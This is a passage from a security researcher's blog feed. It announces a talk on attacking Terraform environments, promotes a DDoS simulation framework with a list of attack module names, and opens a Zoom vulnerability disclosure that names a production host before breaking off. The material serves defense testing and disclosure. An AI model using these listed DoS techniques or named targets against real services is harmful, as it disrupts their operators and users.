&lt;p&gt;FullHunt is the Next-Generation Attack Surface Management Platform. FullHunt enables companies to discover all of their attack surfaces, monitor them for exposure, and continuously scan them for the latest security vulnerabilities and risks. We help companies around the world in securing their external attack surface using our technologies that are scanning millions of Internet-connected assets and cloud resources.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Are you an enterprise that is looking to build security for their External Attack Surface? Please reach out to us at &lt;a href=&quot;https://fullhunt.io&quot;&gt;fullhunt.io&lt;/a&gt;, and we will be happy to solve your challenges.&lt;/strong&gt;&lt;/p&gt;

&lt;h1 id=&quot;references&quot;&gt;References&lt;/h1&gt;

&lt;ol&gt;
  &lt;li&gt;https://www.bbc.com/news/technology-58817658&lt;/li&gt;
  &lt;li&gt;https://www.theverge.com/2021/10/6/22712365/twitch-data-leak-breach-security-confirmation-comments&lt;/li&gt;
  &lt;li&gt;https://www.nytimes.com/2021/10/06/technology/twitch-data-breach.html&lt;/li&gt;
&lt;/ol&gt;</content><author><name>mazinahmed</name></author><category term="blog" /><category term="blog" /><category term="research" /><category term="twitch" /><category term="devops" /><category term="devsecops" /><category term="cloudsecurity" /><summary type="html"></summary></entry><entry><title type="html">Attacking Modern Environments Series: Attack Vectors on Terraform Environments</title><link href="https://mazinahmed.net/blog/attacking-terraform-environments/" rel="alternate" type="text/html" title="Attacking Modern Environments Series: Attack Vectors on Terraform Environments" /><published>2022-01-29T00:00:00-06:00</published><updated>2022-01-29T00:00:00-06:00</updated><id>https://mazinahmed.net/blog/attacking-terraform-environments</id><content type="html" xml:base="https://mazinahmed.net/blog/attacking-terraform-environments/">&lt;hr /&gt;

&lt;p&gt;I have given a talk about my latest research, “Attack Vectors on Terraform Environments”.&lt;/p&gt;

&lt;h2 id=&quot;about-the-talk&quot;&gt;About the talk&lt;/h2&gt;
&lt;p&gt;Ever come across an environment in an engagement that uses Terraform for IAAC (infrastructure-as-code) management?
Almost every modern company does now.&lt;/p&gt;

&lt;p&gt;In this talk, I will be sharing techniques and attack vectors to exploit and compromise Terraform environments in engagements, as well as patterns that I have seen that achieve successful infrastructure takeover against companies.
I will be also covering detection and prevention methods for each attack vector discussed in my talk.&lt;/p&gt;

&lt;p&gt;This is part of my work-in-progress research in cloud security and attacking modern environments.&lt;/p&gt;

&lt;h2 id=&quot;recorded-talk&quot;&gt;Recorded Talk&lt;/h2&gt;

&lt;iframe width=&quot;560&quot; height=&quot;310&quot; src=&quot;https://www.youtube.com/embed/8fnbkZwZsRg&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h3 id=&quot;watch-on-youtube&quot;&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=8fnbkZwZsRg&quot;&gt;Watch on Youtube&lt;/a&gt;&lt;/h3&gt;

&lt;h3 id=&quot;download-slides-pdf&quot;&gt;&lt;a href=&quot;https://github.com/mazen160/public/raw/master/documents/Attacking%20Modern%20Environments%20Series%20-%20Attacking%20Terraform%20Environments.pdf&quot;&gt;Download: Slides (PDF)&lt;/a&gt;&lt;/h3&gt;
&lt;h3 id=&quot;download-slides-pptx&quot;&gt;&lt;a href=&quot;https://github.com/mazen160/public/raw/master/documents/Attacking%20Modern%20Environments%20Series%20-%20Attacking%20Terraform%20Environments.pptx&quot;&gt;Download: Slides (PPTX)&lt;/a&gt;&lt;/h3&gt;</content><author><name>mazinahmed</name></author><category term="blog" /><category term="blog" /><category term="research" /><category term="terraform" /><category term="devops" /><category term="devsecops" /><category term="cloudsecurity" /><summary type="html"></summary></entry><entry><title type="html">Interview With the AppSec Podcast: Terraform Security</title><link href="https://mazinahmed.net/blog/interview-with-appsec-podcast-terraform-security/" rel="alternate" type="text/html" title="Interview With the AppSec Podcast: Terraform Security" /><published>2021-10-17T00:00:00-05:00</published><updated>2021-10-17T00:00:00-05:00</updated><id>https://mazinahmed.net/blog/interview-with-appsec-podcast-terraform-security</id><content type="html" xml:base="https://mazinahmed.net/blog/interview-with-appsec-podcast-terraform-security/">&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/static/dd31ccbf-b8e2-4d56-9c5b-ae3a2d2bd65a.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I did an interview with the AppSec Podcast to talk about IAC and Terraform. We discussed Terraform, why IAAC is important to your organization, technical risks brought when running Terraform on your environment, and few discussions related to my &lt;a href=&quot;https://www.youtube.com/watch?v=d4V75rrVrL4&quot;&gt;DEFCON talk about Attack Vectors on Terraform Environments&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/static/81b656d7-20eb-41c9-9fd1-0338125186a6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;310&quot; src=&quot;https://www.youtube.com/embed/jdh-yHKLAWU&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h2 id=&quot;listen-to-the-podcast&quot;&gt;Listen to the Podcast&lt;/h2&gt;

&lt;h3 id=&quot;watch-on-youtube&quot;&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=jdh-yHKLAWU&quot;&gt;Watch on Youtube&lt;/a&gt;&lt;/h3&gt;

&lt;h3 id=&quot;listen-on-spotify&quot;&gt;&lt;a href=&quot;https://open.spotify.com/episode/0bojnJd6kyBOomojMFXKgX?si=d394stezSfWAfsSwy3MKNA&quot;&gt;Listen on Spotify&lt;/a&gt;&lt;/h3&gt;

&lt;h3 id=&quot;listen-on-apple-podcast&quot;&gt;&lt;a href=&quot;https://podcasts.apple.com/us/podcast/mazin-ahmed-terraform-security/id1154351685?i=1000537757479&quot;&gt;Listen on Apple Podcast&lt;/a&gt;&lt;/h3&gt;</content><author><name>mazinahmed</name></author><category term="blog" /><category term="blog" /><category term="interview" /><category term="podcast" /><category term="terraform" /><category term="devops" /><category term="devsecops" /><category term="cloudsecurity" /><summary type="html"></summary></entry><entry><title type="html">tfquery: Run SQL queries on your Terraform infrastructure</title><link href="https://mazinahmed.net/blog/tfquery-project-release/" rel="alternate" type="text/html" title="tfquery: Run SQL queries on your Terraform infrastructure" /><published>2021-04-28T00:00:00-05:00</published><updated>2021-04-28T00:00:00-05:00</updated><id>https://mazinahmed.net/blog/tfquery-project-release</id><content type="html" xml:base="https://mazinahmed.net/blog/tfquery-project-release/">&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/static/7150a8dc-f101-423c-934a-ffa24a396e66.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Have you ever tried analyzing Terraform environment with thousands of cloud resources for security and DevOps? It’s used to be hard, until now!&lt;/p&gt;

&lt;p&gt;I’m open-sourcing my newest project, tfquery: a framework that allows running SQL queries on Terraform code. It saved me dozens of hours in analysis.&lt;/p&gt;

&lt;p&gt;Tfquery is made to help in answering questions that are hard to answer about your infrastructure-as-code. It allows querying resources and analyzing its configuration using a SQL-powered framework.&lt;/p&gt;

&lt;p&gt;I built it out of a real-world problem where I need to understand an extremely large Terraform environment. Has been highly helpful in making work easier.&lt;/p&gt;

&lt;p&gt;This is a starting point for an awesome project. Feel free to read more at the Github repository.&lt;/p&gt;

&lt;h3 id=&quot;github-repository-httpsgithubcommazen160tfquery&quot;&gt;Github Repository: &lt;a href=&quot;https://github.com/mazen160/tfquery&quot;&gt;https://github.com/mazen160/tfquery&lt;/a&gt;&lt;/h3&gt;</content><author><name>mazinahmed</name></author><category term="blog" /><category term="blog" /><category term="project" /><category term="terraform" /><category term="devops" /><category term="devsecops" /><category term="cloudsecurity" /><summary type="html"></summary></entry><entry><title type="html">DDoS is not Dead: Building a Scalable DDoS Framework</title><link href="https://mazinahmed.net/blog/stressful-ddos-framework/" rel="alternate" type="text/html" title="DDoS is not Dead: Building a Scalable DDoS Framework" /><published>2021-04-13T00:00:00-05:00</published><updated>2021-04-13T00:00:00-05:00</updated><id>https://mazinahmed.net/blog/stressful-ddos-framework</id><content type="html" xml:base="https://mazinahmed.net/blog/stressful-ddos-framework/">&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/static/cb37c2ae-5496-4f73-8e32-3e97a2bf736e.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;abstract&quot;&gt;Abstract&lt;/h1&gt;

&lt;p&gt;I’m releasing my latest project, &lt;a href=&quot;https://stressful.io&quot;&gt;Stressful.io&lt;/a&gt;, an advanced DDoS framework for testing DDoS defenses at scale. I’m also providing a fully free simulation to non-profit organizations and startups focused on privacy and digital rights.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;I have always been fascinated by DDoS attacks. You may have the most sophisticated defenses, yet, your organization can be directly affected by a DDoS attack that takes down your payment gateway for 3 hours. DDoS attacks are a real concern that needs to be put on the organization’s radar, not on a postmortem after an attack happens.&lt;/p&gt;

&lt;h2 id=&quot;time-is-money-especially-on-downtime&quot;&gt;Time is Money, Especially on Downtime&lt;/h2&gt;

&lt;p&gt;The cost of downtime is high and expensive for businesses, and it varies from one industry to another. A payment gateway processor downtime can affect many customers that solely rely on the payment gateway to operate. An hour’s downtime costs millions of dollars in losses.&lt;/p&gt;

&lt;p&gt;The same goes for an E-Commerce website, some E-Commerces have more than 30% of their revenue coming from Black Friday each year. A DDoS attack that disrupts users from making purchases on Black Friday can cause major losses for the E-commerce business.&lt;/p&gt;

&lt;p&gt;Furthermore, when a DDoS attack hits a SAAS platform and causes an outage, it will indirectly disrupt thousands (if not millions) of businesses and people’s lives around the world. Think of this as your day-to-day email provider, a CDN that delivers JavaScript for your websites, or even Google Docs that I’m using to write this blog post.&lt;/p&gt;

&lt;h2 id=&quot;protonmail-ddos-attack-changed-my-perspective&quot;&gt;ProtonMail DDoS Attack Changed My Perspective&lt;/h2&gt;

&lt;p&gt;Back when I was working at ProtonMail, I had the opportunity to witness one of the largest attacks that happened in Europe in 2015 &lt;a href=&quot;https://www.techrepublic.com/article/exclusive-inside-the-protonmail-siege-how-two-small-companies-fought-off-one-of-europes-largest-ddos/&quot;&gt;1&lt;/a&gt; and 2018 &lt;a href=&quot;https://techcrunch.com/2018/06/27/protonmail-suffers-ddos-attack-that-takes-its-email-service-down-for-minutes/&quot;&gt;2&lt;/a&gt;. These attacks were devastating and changed my perspective on DDoS attacks and their effectiveness.&lt;/p&gt;

&lt;p&gt;ProtonMail security has some of the most talented people that I have had the chance to work with. I can’t imagine how this attack could have been handled without the work of all the amazing ProtonMail team.&lt;/p&gt;

&lt;p&gt;We had built up awesome technologies to prevent attacks that could breach the data of ProtonMail, yet, a massive DDoS attack allowed attackers to disrupt the availability of ProtonMail to users. A DDoS attack is not capable of risking the security nor the privacy of ProtonMail, but it was effective to put us in a stressful situation to fight back and return the services back to normal.&lt;/p&gt;

&lt;p&gt;If there is a main lesson I learned from this experience is DDoS simulations matter. If we simulate a DDoS attack with similar capabilities and TTPs (tactics, techniques, and procedures), we would be prepared and possibly more ready to handle an attack with this size. Putting DDoS and availability risks on the map became important for me when building a security program of any size.&lt;/p&gt;

&lt;h1 id=&quot;building-the-dream-product-stressful-framework&quot;&gt;Building the Dream Product: Stressful Framework&lt;/h1&gt;

&lt;p&gt;I explored the current market and haven’t found a professional service that satisfies my vision of what should be available to companies. My vision is clear: as a customer, I want to have a trusted platform where I can consult for verifying the existing DDoS defenses, to show me what’s wrong based on research and proven tests, and to show me how to patch weaknesses.&lt;/p&gt;

&lt;p&gt;Trusting a security vendor blindly is always a bad idea, companies in the market can easily sell snake oil, promising 100% protection. Without verification testing, I do not trust a security product in preventing attacks.&lt;/p&gt;

&lt;h3 id=&quot;when-i-didnt-find-a-solution-i-started-the-journey-of-building-stressfulio&quot;&gt;When I didn’t find a solution, I started the journey of building Stressful.io.&lt;/h3&gt;

&lt;h2 id=&quot;researching-ttps&quot;&gt;Researching TTPs&lt;/h2&gt;

&lt;p&gt;The most difficult part in having this project come to reality was the research part. I started collecting repositories and historical archives for attacks that have been witnessed in the past 15 years. I also monitored darknet sources for new trends and techniques. Every new research that involves DDoS attacks has been passionately reviewed and analyzed, and I built up a lab in the cloud to replicate attacks and rate researches and techniques I have been seeing.&lt;/p&gt;

&lt;p&gt;I also reverse-engineered tools published in the black market that are being used to conduct active attacks. I studied TTPs of different groups and built up my internal knowledge-base for everything related to DDoS attacks.&lt;/p&gt;

&lt;p&gt;This was majorly a side project that I have been imagining over the years, and in 2020, I took serious focus to complete the product.&lt;/p&gt;

&lt;h2 id=&quot;quality-vs-quantity-attacks&quot;&gt;Quality vs. Quantity Attacks&lt;/h2&gt;

&lt;p&gt;One factor that the market is fully relying on measuring the complexity of DDoS attacks is the total quantity the threat group was able to generate against the target. The thing is, generating traffic today is much easier than before. A 50 GBPS DDoS attack today is much easier to generate than 10 years ago, where the cloud era wasn’t as huge as before. Infrastructure deployment 10 years ago wasn’t as accessible as today. Today, Infrastructure-as-code became the de-facto for deploying a fully scalable infrastructure within minutes. The same goes for defense, mitigating quantity DDoS attacks became much better over the years with cloud and CDN providers.&lt;/p&gt;

&lt;p&gt;On the other side, DDoS attacks that focus on Application-layer exploitation were being dismissed by most deployments I have personally reviewed over the years. Additionally, DoS vectors that exploits and abuses a security vulnerability of a given product or application are patterns that I have been seeing.&lt;/p&gt;

&lt;p&gt;Application-layer DDoS attacks are harder to defend, much difficult to understand, and most security vendors do not protect against them. If a security vendor claims to protect against Application-layer DoS attacks, I would be happy to provide a demo to showcase all their weaknesses using the &lt;a href=&quot;https://stressful.io&quot;&gt;Stressful.io&lt;/a&gt; framework.&lt;/p&gt;

&lt;h2 id=&quot;stressfulio-architecture&quot;&gt;Stressful.io Architecture&lt;/h2&gt;

&lt;p&gt;I’m planning to release technical documentation in the future about the architecture I built for &lt;a href=&quot;https://stressful.io&quot;&gt;Stressful.io&lt;/a&gt; that fully relies on being cloud-native to scale.&lt;/p&gt;

&lt;p&gt;After building the app on &lt;a href=&quot;https://stressful.io&quot;&gt;Stressful.io&lt;/a&gt;, I integrated the CD pipeline with Terraform to deploy the infrastructure used in simulations. I have built the integration with Microsoft Azure, Amazon AWS, and there will be an integration with Google Cloud soon.&lt;/p&gt;

&lt;h3 id=&quot;engine&quot;&gt;Engine&lt;/h3&gt;

&lt;h4 id=&quot;language-of-choice&quot;&gt;Language of Choice?&lt;/h4&gt;

&lt;p&gt;I wrote the framework in Golang as I have been seeing great potential for DDoS in Golang. The networking API in Golang is much reliable, and the concurrency and state management in projects are much promising. Golang is the future for scalable and resource-extensive applications. I have been doing benchmarks on the Stressful, and I’m impressed by various features Golang allows and provides.&lt;/p&gt;

&lt;h3 id=&quot;modules&quot;&gt;Modules&lt;/h3&gt;

&lt;p&gt;I have built modules to support attacks for different vectors.&lt;/p&gt;

&lt;p&gt;This is an example of modules I have been building in the framework:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;HTTP SlowPost Attack&lt;/li&gt;
  &lt;li&gt;HTTP Slowloris attack (GET)&lt;/li&gt;
  &lt;li&gt;HTTP Web Cache-Poisoning Attack&lt;/li&gt;
  &lt;li&gt;HTTP SlowLoris (Infinite Headers)&lt;/li&gt;
  &lt;li&gt;Amazon AWS Denial of Wallet Attacks&lt;/li&gt;
  &lt;li&gt;Microsoft Azure Denial of Wallet Attacks&lt;/li&gt;
  &lt;li&gt;HTTP/2 DoS Attacks&lt;/li&gt;
  &lt;li&gt;HTTP DoS via Headless Browsers&lt;/li&gt;
  &lt;li&gt;WordPress Resource Exhaustion&lt;/li&gt;
  &lt;li&gt;HTTP Hash Collision Attack&lt;/li&gt;
  &lt;li&gt;HTTP Memory Exhaustion&lt;/li&gt;
  &lt;li&gt;Xerxes Attack&lt;/li&gt;
  &lt;li&gt;SOAP XML Quadratic Blowup Attack&lt;/li&gt;
  &lt;li&gt;SOAP XML Billion Laughs Attack&lt;/li&gt;
  &lt;li&gt;HTTP Keep-Alive Flood Attack&lt;/li&gt;
  &lt;li&gt;HTTP Unlimited Downloads&lt;/li&gt;
  &lt;li&gt;HTTP GET Flood&lt;/li&gt;
  &lt;li&gt;HTTP SlowPost (Infinite Uploads)&lt;/li&gt;
  &lt;li&gt;HTTP HULK Attack&lt;/li&gt;
  &lt;li&gt;MySQL Resource Exhaustion&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;This is just part of the modules I have developed. I also develop modules based on specific use-cases and scenarios. Lastly, I will be also keeping an up-to-date arsenal for DoS attacks and modules on the framework.&lt;/p&gt;

&lt;h1 id=&quot;whats-next&quot;&gt;What’s next?&lt;/h1&gt;

&lt;p&gt;Contact me on &lt;a href=&quot;mailto:info@stressful.io?subject=DoS%20Simulation%20Demo%20-%20Query&quot;&gt;info@Stressful.io&lt;/a&gt; to get a free consultation demo for your organization. I’m also providing a fully free simulation to non-profit organizations and startups focused on privacy and digital rights.&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;
Interested in DDoS capabilities for your company? Let’s have a chat and see how I can help!&lt;/p&gt;

&lt;h3 id=&quot;are-you-a-researcher-interested-in-the-ddos-market-and-ddos-defenses&quot;&gt;Are you a researcher interested in the DDoS market and DDoS defenses?&lt;/h3&gt;

&lt;p&gt;Let’s connect and share thoughts. My contact details are available on the website.&lt;/p&gt;

&lt;hr /&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.techrepublic.com/article/exclusive-inside-the-protonmail-siege-how-two-small-companies-fought-off-one-of-europes-largest-ddos/&quot;&gt;https://www.techrepublic.com/article/exclusive-inside-the-protonmail-siege-how-two-small-companies-fought-off-one-of-europes-largest-ddos/&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://techcrunch.com/2018/06/27/protonmail-suffers-ddos-attack-that-takes-its-email-service-down-for-minutes/&quot;&gt;https://techcrunch.com/2018/06/27/protonmail-suffers-ddos-attack-that-takes-its-email-service-down-for-minutes/&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;</content><author><name>mazinahmed</name></author><category term="blog" /><category term="blog" /><category term="project" /><category term="stressful" /><summary type="html"></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://mazinahmed.net/assets/static/cb37c2ae-5496-4f73-8e32-3e97a2bf736e.jpg" /><media:content medium="image" url="https://mazinahmed.net/assets/static/cb37c2ae-5496-4f73-8e32-3e97a2bf736e.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Interview with Sectastic Podcast: How I started, What is FullHunt, and How are Security Startups in the GCC Region</title><link href="https://mazinahmed.net/blog/interview-with-sectastic-podcast/" rel="alternate" type="text/html" title="Interview with Sectastic Podcast: How I started, What is FullHunt, and How are Security Startups in the GCC Region" /><published>2021-03-22T00:00:00-05:00</published><updated>2021-03-22T00:00:00-05:00</updated><id>https://mazinahmed.net/blog/interview-with-sectastic-podcast</id><content type="html" xml:base="https://mazinahmed.net/blog/interview-with-sectastic-podcast/">&lt;hr /&gt;

&lt;p&gt;&lt;img src=&quot;/assets/static/739a0909-9cc2-47d1-896d-2c727121881f.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I did an interview with &lt;a href=&quot;https://www.linkedin.com/in/miladca/&quot;&gt;Milad Aslaner&lt;/a&gt; about how I started in cyber security, what I have been building at FullHunt, the concept of assets discovery and continuous security, and how I started on of the first cyber security startups in the GCC region.&lt;/p&gt;

&lt;iframe width=&quot;560&quot; height=&quot;310&quot; src=&quot;https://www.youtube.com/embed/qJjERXwM5wo&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;h3 id=&quot;watch-on-youtube&quot;&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=qJjERXwM5wo&quot;&gt;Watch on YouTube&lt;/a&gt;&lt;/h3&gt;

&lt;h3 id=&quot;listen-on-spotify&quot;&gt;&lt;a href=&quot;https://open.spotify.com/episode/5wFfNabozVKdwNfVpMNTm3&quot;&gt;Listen on Spotify&lt;/a&gt;&lt;/h3&gt;</content><author><name>mazinahmed</name></author><category term="blog" /><category term="blog" /><category term="interview" /><category term="podcast" /><summary type="html"></summary></entry><entry><title type="html">Hacking Zoom: Uncovering Tales of Security Vulnerabilities in Zoom</title><link href="https://mazinahmed.net/blog/hacking-zoom/" rel="alternate" type="text/html" title="Hacking Zoom: Uncovering Tales of Security Vulnerabilities in Zoom" /><published>2020-08-09T00:00:00-05:00</published><updated>2020-08-09T00:00:00-05:00</updated><id>https://mazinahmed.net/blog/hacking-zoom</id><content type="html" xml:base="https://mazinahmed.net/blog/hacking-zoom/">&lt;hr /&gt;

&lt;h1 id=&quot;hacking-zoom&quot;&gt;Hacking Zoom&lt;/h1&gt;

&lt;h2 id=&quot;uncovering-tales-of-security-vulnerabilities-in-zoom&quot;&gt;Uncovering Tales of Security Vulnerabilities in Zoom&lt;/h2&gt;

&lt;p&gt;This blog post discusses my experiments in testing and hacking Zoom.&lt;/p&gt;

&lt;p&gt;Zoom has become one of the most high-performing tech companies of 2020. Zoom is a digital video conferencing software that went public in IPO last year&lt;a href=&quot;https://www.cnbc.com/2019/04/18/zoom-ipo-stock-begins-trading-on-nasdaq.html&quot;&gt;1&lt;/a&gt;, a few months before the global pandemic.&lt;/p&gt;

&lt;p&gt;Zoom grew rapidly over the past year going from 10M active users in early 2019 to over 200M by mid-2020.&lt;/p&gt;

&lt;p&gt;The popularity of Zoom has made it a high-profile target for hackers, nefarious actors, and the security community. Organizations worldwide are using Zoom to enable remote work. The UK government even used Zoom for cabinet meetings&lt;a href=&quot;https://www.infosecurity-magazine.com/news/uk-government-zoom-despite-mod/&quot;&gt;2&lt;/a&gt;. Simply put, we can see Zoom in every part of our lives today.&lt;/p&gt;

&lt;p&gt;This post shares my research and experiments in testing and hacking Zoom.&lt;/p&gt;

&lt;h1 id=&quot;executive-summary&quot;&gt;Executive Summary&lt;/h1&gt;

&lt;p&gt;My research focused on identifying security vulnerabilities in Zoom. The result of the research revealed several severe security vulnerabilities that affect the Zoom production and development infrastructure, the Zoom Linux app, and Zoom’s implementation of end-to-end encryption implementation.&lt;/p&gt;

&lt;p&gt;My experience with Zoom’s security and its VDP (vulnerability disclosure program) did not match what I had seen in the public media. I assume this is because Zoom focused on the security incidents that had generated the most negative public PR. This is also likely due to Zoom implementing a last-minute bug bounty program after its user base boomed during the global pandemic.&lt;/p&gt;

&lt;p&gt;The first finding that I identified in April 2020 has been not patched. The first time I received a conclusive response regarding the finding was on July 14, 2020, after 4 months of reporting the vulnerability and numerous follow-ups from my side.&lt;/p&gt;

&lt;p&gt;When I submitted my CFP to DEFCON 2020, I conducted another round of experiments on Zoom, where I identified new security vulnerabilities that affected different Zoom products. All discovered vulnerabilities were responsibly disclosed to Zoom.&lt;/p&gt;

&lt;p&gt;I would also like to note that all of my research was self-funded. I have also not received any bounty/reward for my efforts by Zoom.&lt;/p&gt;

&lt;h2 id=&quot;list-of-identified-vulnerabilities&quot;&gt;List of Identified Vulnerabilities&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;Zoom Exposed Public Kerberos Authentication Server&lt;/li&gt;
  &lt;li&gt;Memory Leak on Zoom Production Server&lt;/li&gt;
  &lt;li&gt;Unexploitable RCE on Zoom Production Server&lt;/li&gt;
  &lt;li&gt;Shadow IT Issues on accessible Zoom servers&lt;/li&gt;
  &lt;li&gt;Zoom App for Linux:
    &lt;ul&gt;
      &lt;li&gt;Bad Design Practise on TLS/SSL implementation&lt;/li&gt;
      &lt;li&gt;A Really Bad Design Practice on Zoom Launcher Implementation.&lt;/li&gt;
      &lt;li&gt;End-to-End encrypted messages between Zoom users are stored on-disk in plain-text.&lt;/li&gt;
      &lt;li&gt;Zoom Local Database accessible by all local users, including private end-to-end encrypted messages (stored in plain-text), and access tokens.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The responsible disclosure section discusses the process I have been through in conducting a responsible disclosure with Zoom. It was a painful experience with a lack of communication from Zoom for most of the time. There are many things that could have been done to improve the Zoom VDP.&lt;/p&gt;

&lt;p&gt;I can see that Zoom had difficulties building their bug bounty program. As a result,  I’m also listing suggestions to help enhance the program at the end of the post.&lt;/p&gt;

&lt;h1 id=&quot;who-am-i&quot;&gt;Who Am I?&lt;/h1&gt;

&lt;p&gt;I’m a cyber security engineer that specializes in offensive security and AppSec. Read more about my previous work at https://mazinahmed.net/.&lt;/p&gt;

&lt;h1 id=&quot;table-of-contents&quot;&gt;Table of Contents&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;Introduction&lt;/li&gt;
  &lt;li&gt;Identifying Attack Surface&lt;/li&gt;
  &lt;li&gt;Findings
    &lt;ul&gt;
      &lt;li&gt;Zoom Public Kerberos Authentication
        &lt;ul&gt;
          &lt;li&gt;Attacking Kerberos&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Discovery of a Memory Leak on a Zoom Production Server
        &lt;ul&gt;
          &lt;li&gt;Automating the Exploitation&lt;/li&gt;
          &lt;li&gt;A Memory Leak is not the end…&lt;/li&gt;
          &lt;li&gt;Zoom’s Prevention&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;Shadow IT &amp;amp; Zoom&lt;/li&gt;
      &lt;li&gt;Zoom App for Linux
        &lt;ul&gt;
          &lt;li&gt;Zoom TLS/SSL is Broken By Design on Linux&lt;/li&gt;
          &lt;li&gt;Zoom Launcher Implementation: What’s a badly-designed application launcher? Zoom Launcher for Linux.&lt;/li&gt;
          &lt;li&gt;Zoom is End-to-End Encrypted? Not fully.&lt;/li&gt;
          &lt;li&gt;Zoom Local Database Implementation: Bad practice for Linux security.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Responsible Disclosure
    &lt;ul&gt;
      &lt;li&gt;Timeline&lt;/li&gt;
      &lt;li&gt;Zoom’s analysis &amp;amp; my response to the analysis.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Conclusion&lt;/li&gt;
  &lt;li&gt;Acknowledgment&lt;/li&gt;
  &lt;li&gt;References&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;recorded-conference-talk&quot;&gt;Recorded Conference Talk&lt;/h2&gt;

&lt;iframe width=&quot;560&quot; height=&quot;310&quot; src=&quot;https://www.youtube.com/embed/PUR7sk4mjLo&quot; frameborder=&quot;0&quot; allowfullscreen=&quot;&quot;&gt;&lt;/iframe&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;introduction&quot;&gt;Introduction&lt;/h1&gt;

&lt;p&gt;I started my first round of tests on Zoom in April 2020. My goal was to find an impactful security vulnerability that affects Zoom infrastructure and users. I identified a memory leak vulnerability that affects an API belonging to Zoom production infrastructure - the details of the finding, as well as other findings, are discussed later in the article.&lt;/p&gt;

&lt;p&gt;Once I confirmed the presence of the vulnerability, I reported it directly to security@zoom.us per their security page at zoom.us/security.&lt;/p&gt;

&lt;p&gt;I expected I would be receiving a quick responsible confirmation, followed by a patch, and probably a reward. Instead, I have been in a continuous circle of follow-ups with no response regarding my finding - the responsible disclosure.&lt;/p&gt;

&lt;p&gt;I also contacted Luta Security, which was a contractor to Zoom to set up their VDP during Q1-Q2 2020, but there was no luck either in getting a fix or a detailed analysis for the responsible disclosure.&lt;/p&gt;

&lt;p&gt;After all of the confusion about the attempts of responsible disclosure, I decided to take my research to DEFCON 2020. I submitted my CFP and notified Zoom regarding my intentions of disclosing my finding in Zoom on June 05, 2020. I still haven’t received a conclusive response after that.&lt;/p&gt;

&lt;p&gt;When my CFP was accepted, I started conducting further security research on Zoom and found new vulnerabilities that were affecting their infrastructure, the Zoom Linux app, and their end-to-end encryption implementation.&lt;/p&gt;

&lt;p&gt;I reported all of the new findings to Zoom on July 11, 2020, repeating my intentions of disclosing all of my research in DEFCON 2020. This was where I received the first conclusive response from Zoom.&lt;/p&gt;

&lt;h1 id=&quot;identifying-attack-surface&quot;&gt;Identifying Attack Surface&lt;/h1&gt;

&lt;p&gt;My first step when testing on targets is the attack surface identification. It’s a step where I do the reconnaissance phase to understand the running systems, exposed APIs, (un)maintained services, and everything that can be interesting from an adversary point of view.&lt;/p&gt;

&lt;p&gt;Before attacking Zoom, I wasn’t aware of the attack surface; I had to learn it during this research.&lt;/p&gt;

&lt;h2 id=&quot;domains-discovery&quot;&gt;Domains Discovery&lt;/h2&gt;

&lt;p&gt;Luckily for me, I run &lt;a href=&quot;https://FullHunt.io&quot;&gt;FullHunt.io&lt;/a&gt;, a vulnerability intelligence platform that aids in the attack surface discovery, monitoring, and automating security.&lt;/p&gt;

&lt;p&gt;There is an internal FullHunt API that allows querying domains owned by organizations. I ran a query that returned more than 13 domains.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/static/aa2beb87-a08b-4dcd-b1a3-6c24f4cde22b.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I added them to my FullHunt account to automate the discovery process. While I collected a tremendous amount of data I didn’t have the time to test everything, as this research is a personal non-funded experiment I was doing in my free time. I focused on a portion of the attack surface. I will be show-casing various findings I identified.&lt;/p&gt;

&lt;h1 id=&quot;findings&quot;&gt;Findings&lt;/h1&gt;

&lt;h1 id=&quot;zoom-public-kerberos-authentication&quot;&gt;Zoom Public Kerberos Authentication&lt;/h1&gt;

&lt;p&gt;While port-scanning different assets, an asset grabbed my attention.&lt;/p&gt;

&lt;p&gt;Targets: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ca01.idm.meetzoom.us&lt;/code&gt;&lt;/p&gt;

